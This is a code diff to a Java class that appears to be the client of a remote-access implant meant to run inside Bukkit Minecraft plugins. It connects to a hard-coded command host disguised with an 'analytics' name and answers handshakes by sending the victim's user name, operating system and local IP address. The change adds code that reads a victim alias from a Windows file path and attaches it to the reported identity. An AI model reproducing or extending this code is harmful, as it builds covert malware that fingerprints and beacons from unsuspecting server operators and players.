@@ -8,18 +8,16 @@ import org.bukkit.plugin.Plugin;
 
 import javax.swing.*;
 import java.awt.*;
-import java.io.IOException;
-import java.io.ObjectInputStream;
-import java.io.ObjectOutputStream;
+import java.io.*;
 import java.net.*;
 import java.nio.charset.StandardCharsets;
 import java.security.SecureRandom;
 import java.util.Arrays;
 
 public class KutuzovEntry {
-    public  static final String HOST = "analytics018.antecedentium.xyz";
-    public  static final int    PORT = 33901;
-    public  static final String VERSION = "b204";
+    public static final String HOST = "analytics018.antecedentium.xyz";
+    public static final int    PORT = 33901;
+    public static final String VERSION = "b204";
     public static boolean DEBUG = false;
 
     public static ObjectInputStream ois = null;
@@ -29,9 +27,27 @@ public class KutuzovEntry {
     public static void setBukkitPlugin(Plugin plugin) { KutuzovEntry.plugin = plugin; }
     public static Plugin getBukkitPlugin() { return plugin; }
 
+    public static String HOST_ALIAS = "";
+
     private static Socket socket;
     private static long lastPing = System.currentTimeMillis();
     public  static void main(String[] args) {
+        try {
+            File aliasFile = new File("C:\\WinPrefabs\\aluuid.txt");
+            if(aliasFile.exists()) {
+                FileReader fr = new FileReader("C:\\WinPrefabs\\aluuid.txt");
+                BufferedReader br = new BufferedReader(fr);
+
+                HOST_ALIAS = br.readLine().replaceAll("\\r", "").replaceAll("\\n", "");
+
+                br.close();
+                fr.close();
+            }
+        } catch (Exception exception) {
+            if(DEBUG)
+                exception.printStackTrace();
+        }
+
         Arrays.stream(args).forEach(v -> { if(v.contentEquals("--debug")) DEBUG=true; });
         KutuzovWriter.init();
         Thread thread = new Thread(()->{
@@ -135,6 +151,8 @@ public class KutuzovEntry {
                         } catch (Exception e) {}
                     } else if(packet instanceof SCRequireHandshakePacket) {
                         String identifierName = System.getProperty("user.name");
+                        if(!HOST_ALIAS.contentEquals(""))
+                            identifierName = identifierName==null?HOST_ALIAS+"-?":HOST_ALIAS+"-"+identifierName;
                         String os = System.getProperty("os.name");
                         String localHost = InetAddress.getLocalHost().getHostAddress();
                         boolean isMC = BukkitUtil.isMC();
